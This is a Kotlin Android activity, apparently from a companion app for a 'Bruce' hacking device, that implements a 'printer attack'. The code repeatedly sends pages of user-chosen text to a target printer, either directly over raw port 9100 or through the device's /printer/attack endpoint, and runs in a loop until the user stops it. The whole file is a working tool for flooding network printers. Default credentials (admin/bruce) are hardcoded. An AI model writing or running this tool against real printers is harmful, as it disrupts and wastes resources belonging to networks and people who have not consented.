package com.example.bruceir

import android.os.Bundle
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import java.io.PrintWriter
import java.net.Socket
import java.net.URLEncoder

class PrinterAttackActivity : AppCompatActivity() {

    private var isRunning = false
    private lateinit var baseUrl: String
    private lateinit var user: String
    private lateinit var pass: String

    override fun attachBaseContext(newBase: android.content.Context) {
        val prefs = newBase.getSharedPreferences("settings", MODE_PRIVATE)
        val lang = prefs.getString("lang", "en") ?: "en"
        val locale = java.util.Locale(lang)
        java.util.Locale.setDefault(locale)
        val config = android.content.res.Configuration(newBase.resources.configuration)
        config.setLocale(locale)
        super.attachBaseContext(newBase.createConfigurationContext(config))
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_printer_attack)

        val prefs = getSharedPreferences("settings", MODE_PRIVATE)
        baseUrl = prefs.getString("bruce_url", "http://bruce.local") ?: "http://bruce.local"
        user = prefs.getString("bruce_user", "admin") ?: "admin"
        pass = prefs.getString("bruce_pass", "bruce") ?: "bruce"

        val btnStart = findViewById<Button>(R.id.btnStartPrinter)
        val btnStop = findViewById<Button>(R.id.btnStopPrinter)
        val tvStatus = findViewById<TextView>(R.id.tvPrinterStatus)

        btnStart.setOnClickListener {
            val printerIp = findViewById<EditText>(R.id.etPrinterIp).text.toString()
            val text = findViewById<EditText>(R.id.etPrintText).text.toString()
            val delay = findViewById<EditText>(R.id.etPrintDelay).text.toString().toLongOrNull() ?: 5L
            val isBruceMode = findViewById<RadioButton>(R.id.rbBruce).isChecked

            if (printerIp.isEmpty()) {
                Toast.makeText(this, "Enter Printer IP", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            isRunning = true
            btnStart.visibility = Button.GONE
            btnStop.visibility = Button.VISIBLE
            tvStatus.text = "Attack Running..."

            Thread {
                while (isRunning) {
                    try {
                        if (isBruceMode) {
                            // Bruce Proxy Mode
                            val encodedText = URLEncoder.encode(text, "UTF-8")
                            val url = "$baseUrl/printer/attack?target=$printerIp&text=$encodedText"
                            BruceUtils.downloadFileContent(url, user, pass)
                        } else {
                            // Direct Phone Mode (Port 9100 RAW)
                            val socket = Socket(printerIp, 9100)
                            socket.soTimeout = 2000
                            val out = PrintWriter(socket.getOutputStream(), true)
                            out.println("\n\n\n")
                            out.println("********************************")
                            out.println("         $text")
                            out.println("********************************")
                            out.println("\n\n\n\u000C") // Form Feed (Cut/Eject)
                            out.close()
                            socket.close()
                        }
                        
                        runOnUiThread { tvStatus.text = "Page sent to $printerIp" }
                    } catch (e: Exception) {
                        runOnUiThread { tvStatus.text = "Error: ${e.message}" }
                    }
                    
                    if (!isRunning) break
                    Thread.sleep(delay * 1000)
                }
            }.start()
        }

        btnStop.setOnClickListener {
            isRunning = false
            btnStart.visibility = Button.VISIBLE
            btnStop.visibility = Button.GONE
            tvStatus.text = "Stopped"
            
            if (findViewById<RadioButton>(R.id.rbBruce).isChecked) {
                Thread {
                    val url = "$baseUrl/printer/stop"
                    BruceUtils.downloadFileContent(url, user, pass)
                }.start()
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
    }
}
